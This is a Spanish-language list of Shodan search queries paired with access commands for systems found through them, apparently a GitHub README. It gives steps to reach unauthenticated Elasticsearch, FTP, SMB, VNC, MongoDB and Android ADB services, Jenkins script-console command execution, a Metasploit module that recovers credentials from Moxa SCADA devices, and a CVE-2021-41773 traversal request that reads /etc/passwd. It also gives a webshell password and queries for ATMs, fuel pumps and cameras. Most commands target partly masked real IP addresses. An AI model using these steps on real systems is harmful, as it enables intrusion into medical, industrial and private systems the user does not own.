# Shodan Dorks 2023

Lista de Shodan Dorks + herramientas para estos

# DICOM 
El estándar DICOM (Digital Imaging and Communications in Medicine) es un estándar utilizado en la industria médica para la gestión, almacenamiento y transmisión de imágenes médicas, como radiografías, tomografías computarizadas (TC), imágenes de resonancia magnética (IRM), entre otras.

```sh
"DICOM Server Response" port:104
```
```sh
python3 Dicom.py
```

# Elasticsearch
Elasticsearch es un motor de búsqueda y análisis distribuido, de código abierto, basado en Lucene. Se utiliza para indexar, buscar y analizar grandes volúmenes de datos en tiempo real. Está diseñado para manejar datos no estructurados o semiestructurados y es especialmente útil para casos de uso en los que se requiere búsqueda y análisis de texto, logística, monitoreo y análisis de registros, y más

```sh
port:"9200" elastic: "Total Size:"
```
```sh
curl -X GET "http://192.x.x.153:9200/_cat/indices?v"
curl -X GET "http://192.x.x.153:9200/.monitoring-beats-7-2023.08.30"
curl -X GET "http://192.x.x.153:9200/_search?pretty=true"
```

```sh
python3 elastic.py -t 192.x.x.153
```

## Access FTP Anonymous
El acceso FTP anónimo es una forma de conectarse a un servidor FTP sin proporcionar credenciales de autenticación específicas.

```sh
"220" "230 Login successful." port:21
230 'anonymous@' login ok 
"Anonymous+access+allowed" port:"21"
```

```sh
shodan search :"220" "230 Login successful." port:21 --fields ip_str --separator " " | awk '{print $1}' | cat > ips.txt
```
```sh
python3 ftp.py -l ips.txt
```

# Authentication Disabled SMB
La autenticación SMB (Server Message Block) sin credenciales, también conocida como acceso SMB anónimo, permite a los usuarios acceder a recursos compartidos en una red sin proporcionar nombres de usuario ni contraseñas. Esto puede ser útil para acceder a carpetas compartidas que se han configurado para permitir el acceso anónimo.

```sh
"Authentication: disabled" port:445 product:"Samba" 
```
```sh
smbclient -L //200.x.x.29/ -N  
smbclient //200.x.x.29/info
```

## Access authentication disabled VNC
Esto significa que el servidor VNC está configurado para permitir conexiones sin requerir autenticación.

```sh
"authentication disabled" port:5900,5901
```
```sh
vncviewer -passwd none 91.x.x.238
```

## Access authentication disabled MongoDB
Esto significa que el servidor NoSQL MongoDB está configurado para permitir conexiones sin requerir autenticación.

```sh
"MongoDB Server Information" port:27017 -authentication
"Set-Cookie: mongo-express=" "200 OK"
```
```sh
mongo --host 139.x.x.5
```

## Access Jenkins
Se puede visualizar componentes del servicio Jenkins, ejecutar scripts, etc.

```sh
http.component:"jenkins"
title:"Dashboard [Jenkins]"
html:"Dashboard Jenkins"
```
```sh
add /script 
print "uname -a".execute().text
```

## Access devices ADB
Es una aplicación de terminal que le permite conectarse al servicio ADB shell de otros dispositivos Android a través de la red.

```sh
shodan search :Android Debug Bridge port:5555 "Name:" --fields ip_str --separator " " | awk '{print $1}' | cat > ips.txt 
 ```
```sh
python3 adb.py   
```

```sh
adb devices
```

```sh
adb -s 59.x.x.112:5555 shell
```


## Access devices SCADA Moxa 
Sistema SCADA que utiliza productos de la marca Moxa para establecer la conectividad y la comunicación con los dispositivos industriales que están siendo monitoreados y controlados en una infraestructura crítica o proceso industrial.

```sh
"Moxa Nport Device" Status: Authentication enabled port:"4800"
"Moxa Nport Device" Status: Authentication disabled port:"4800"
shodan search --separator , --fields ip_str,port,data "Moxa Nport" | awk '{print $1,$2,$3}' FS=":" | tr '\\', ' ' | awk '{print $1,$7,$8}' | column -t | ccze -A
```

```sh
use auxiliary/admin/scada/moxa_credentials_recovery
set FUNCTION CREDS
set rport 4800
set rhosts 212.x.x.14
run
```

```sh
telnet 212.x.x.14
```

## Exploit Infrastructure RCE CVE-2020-0796
La vulnerabilidad CVE-2020-0796 se refiere a una vulnerabilidad de ejecución de código remoto (RCE, por sus siglas en inglés) que afecta al protocolo de compartición de archivos SMBv3 (Server Message Block version 3). SMB es un protocolo utilizado para compartir archivos, impresoras y otros recursos en redes de computadoras. La versión 3 (SMBv3) es una versión moderna de este protocolo utilizada en sistemas operativos Windows.

Esta vulnerabilidad se conoció coloquialmente como "SMBGhost" o "CoronaBlue" y fue anunciada en marzo de 2020. 

```sh
vuln:CVE-2020-0796
country:pe port:445
```

## Exploit Web RCE CVE-2021-41773
```sh
shodan search :apache 2.4.49  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | cat > url.txt
```

```sh
curl -k http://210.x.x.7/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
```


## Electronic measure

```sh
"Server: EIG Embedded Web Server" "200 Document follows"
```

## Search Web shell 

```sh
html:"wso.php"
```

webshell as default fa769dac7a0a94ee47d8ebe021eaba9e has a match password ghost287


## Search Backup Files

```sh
html:"web.zip"
"web.zip"
```


## OS Windows Obsolete
Tener sistemas Windows obsoletos y sin soporte puede conllevar una serie de peligros y riesgos significativos para la seguridad, la estabilidad y la eficiencia de tus sistemas y datos.


```sh
os:"Windows 5.0" – Windows 2000; support end 2010.
os:"Windows 5.1" – Windows XP; support end 2014.
os:"Windows 2003" – Windows Server 2003; support end 2015.
os:"Windows Vista"– Windows Vista; support end 2017.
os:"Windows 2008" – Windows Server 2008; support end 2020.
os:"Windows 7" – Windows 7; support end 2020.
os:"Windows 8" – Windows 8; support end 2016.
os:"Windows 2011" – Windows Home Server 2011; support end 2016.
os:"Windows 8.1" – Windows 8.1; support end 2018.
os:"Windows 2012" – Windows Server 2012; support end 2018.
```


### city:
Find devices in a particular city.<br/>
`city:"Bangalore"`

### country:
Find devices in a particular country.<br/>
`country:"IN"`

### geo:
Find devices by giving geographical coordinates.<br/>
`geo:"56.913055,118.250862"`

### hostname:
Find devices matching the hostname.<br/>
`server: "gws" hostname:"google"`

### net:
Find devices based on an IP address or /x CIDR.<br/>
`net:210.214.0.0/16`

### os:
Find devices based on operating system.<br/>
`os:"windows 7"`

### port:
Find devices based on open ports.<br/>
`proftpd port:21`

### before/after:
Find devices before or after between a given time.<br/>
`apache after:22/02/2009 before:14/3/2010`

### Citrix:
Find Citrix Gateway.<br/>
`title:"citrix gateway"`

### Wifi Passwords:
Helps to find the cleartext wifi passwords in Shodan.</br>
`html:"def_wirelesspassword"`

### Surveillance Cams:
With username:admin and password: :P</br>
`NETSurveillance uc-httpd`

### Fuel Pumps connected to internet:
No auth required to access CLI terminal.</br>
`"privileged command" GET`

### Windows RDP Password:
But may contain secondary windows auth</br>
`"\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00"`

### Mongo DB servers:
It may give info about mongo db servers and dashboard </br>
`"MongoDB Server Information" port:27017 -authentication`

### FTP servers allowing anonymous access:
Complete Anon access </br>
`"220" "230 Login successful." port:21`

### Jenkins:
Jenkins Unrestricted Dashboard </br>
`x-jenkins 200`

### Hacked routers:
Routers which got compromised </br>
`hacked-router-help-sos`

### Open ATM:
May allow for ATM Access availability </br>
`NCR Port:"161"`

### Telnet Access:
NO password required for telnet access. </br>
`port:23 console gateway`

### Misconfigured Wordpress Sites:
The wp-config.php if accessed can give out the database credentials. </br>
`http.html:"* The wp-config.php creation script uses this file"`

### Hiring:
Find sites hiring. </br>
`"X-Recruiting:"`

### Android Root Bridge:
Find android root bridges with port 5555. </br>
`"Android Debug Bridge" "Device" port:5555`

### Etherium Miners:
Shows the miners running ETH. </br>
`"ETH - Total speed"`

### Tesla Powerpack charging Status:
Helps to find the charging status of tesla powerpack. </br>
`http.title:"Tesla PowerPack System" http.component:"d3" -ga3ca4f2`
